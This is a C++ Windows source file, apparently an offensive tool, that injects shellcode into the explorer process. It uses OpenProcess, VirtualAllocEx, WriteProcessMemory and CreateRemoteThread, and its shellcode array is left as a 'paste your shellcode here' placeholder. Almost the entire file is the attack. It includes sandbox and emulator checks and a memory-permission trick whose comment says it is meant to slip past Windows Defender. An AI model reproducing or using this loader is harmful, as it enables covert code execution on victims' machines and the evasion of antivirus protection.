#include "danger.h"

using namespace std;

DWORD FindProcessId(const char *processName, const size_t &procStrLen)
// ref:
// https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
{
  // Take a snapshot of all processes in the system.
  HANDLE hProcessSnap{CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)};
  if (INVALID_HANDLE_VALUE == hProcessSnap) {
    return 0;
  }

  PROCESSENTRY32 pe32{};
  pe32.dwSize = sizeof(PROCESSENTRY32);

  // Retrieve information about the first process,
  // and exit if unsuccessful
  if (!Process32First(hProcessSnap, &pe32)) {
    CloseHandle(hProcessSnap); // clean the snapshot object
    cout << "[-] Failed to gather information on system processes!\n";
    return 0;
  }

  do {
    if (!strncmp(processName, pe32.szExeFile, procStrLen)) {
      cout << "[+] FOUND process \"" << pe32.szExeFile << "\" ...! :)" << endl;

      // Do some clean up work and return
      CloseHandle(hProcessSnap);
      return pe32.th32ProcessID;
    }
  } while (Process32Next(hProcessSnap, &pe32));
}

HIT_EM_UP {
  auto start{chrono::system_clock::now()};
  Sleep(2000); // sleep for 2s
  auto end{chrono::system_clock::now()};

  chrono::duration<double> elapsed_time{end - start};
  chrono::duration<double> tgt_time{1.5};
  if (elapsed_time < tgt_time) {
    return EXIT_FAILURE;
  }

  if (!VirtualAllocExNuma(GetCurrentProcess(), nullptr, 0x1000,
                          (MEM_COMMIT | MEM_RESERVE), 0x4, 0x0)) {
    cout << "[-] failed to allocate memory.\n";
    return EXIT_FAILURE;
  }

  unsigned char sh_code[]{/* paste your shellcode here */};

  const char *procName{"explorer"};
  size_t procNameLen{strlen(procName)};

  DWORD pid{FindProcessId(procName, procNameLen)};
  if (!pid) {
    return EXIT_FAILURE;
  }

  // Open an existing process
  void *hProcess{OpenProcess(PROCESS_ALL_ACCESS, false, pid)};
  if (!hProcess) {
    cout << "[-] failed to spawn a new process. :(\n";
    return EXIT_FAILURE;
  }

  void *addr{VirtualAllocEx(hProcess, nullptr, 0x1000,
                            (MEM_COMMIT | MEM_RESERVE),
                            PAGE_EXECUTE_READWRITE)};
  if (!addr) {
    cout << "[-] failed to allocate memory for shellcode.\n";
    return EXIT_FAILURE;
  }

  SIZE_T writtenBytes{};
  if (!WriteProcessMemory(hProcess, addr, sh_code, ARRAY_SIZE(sh_code),
                          &writtenBytes)) {
    cout << "[-] failed to write shellcode into the allocated memory in "
            "the target process.";
    return EXIT_FAILURE;
  }

  // the trick is in this :) : we make the memory inaccessible in order to get
  // past Windows Defender which'll think: "Oh! this is all good! seems this is
  // a very important process, lemme get outta here!"
  DWORD oldPerm{};
  if (!VirtualProtectEx(hProcess, addr, ARRAY_SIZE(sh_code), PAGE_NOACCESS,
                        &oldPerm)) {
    cout << "[-] failed to change access rights(PAGE_EXECUTE) for the "
            "shellcode's memory area.\n";
    return EXIT_FAILURE;
  }

  DWORD remoteThreadId{};
  HANDLE hThread{CreateRemoteThread(hProcess, nullptr, 0,
                                    (LPTHREAD_START_ROUTINE)addr, nullptr, 0x4,
                                    &remoteThreadId)};
  if (!hThread) {
    cout << "[-] failed to create shellcode thread in explorer's virtual "
            "memory\n";
    return EXIT_FAILURE;
  }

  Sleep(30000); // sleep for 30s / 30,000ms

  if (!VirtualProtectEx(hProcess, addr, ARRAY_SIZE(sh_code),
                        PAGE_EXECUTE_READWRITE, &oldPerm)) {
    cout << "[-] failed to change access rights(PAGE_EXECUTE_READWRITE) "
            "for the shellcode's memory area.\n";
    return EXIT_FAILURE;
  }

  if (-1UL == ResumeThread(hThread)) {
    cout << "[-] failed to resume suspended shellcode thread.\n";
    return 1;
  }

  cout << "[+] Successfully pwned System!!!!!! :) \n\n";
  return EXIT_SUCCESS;
}
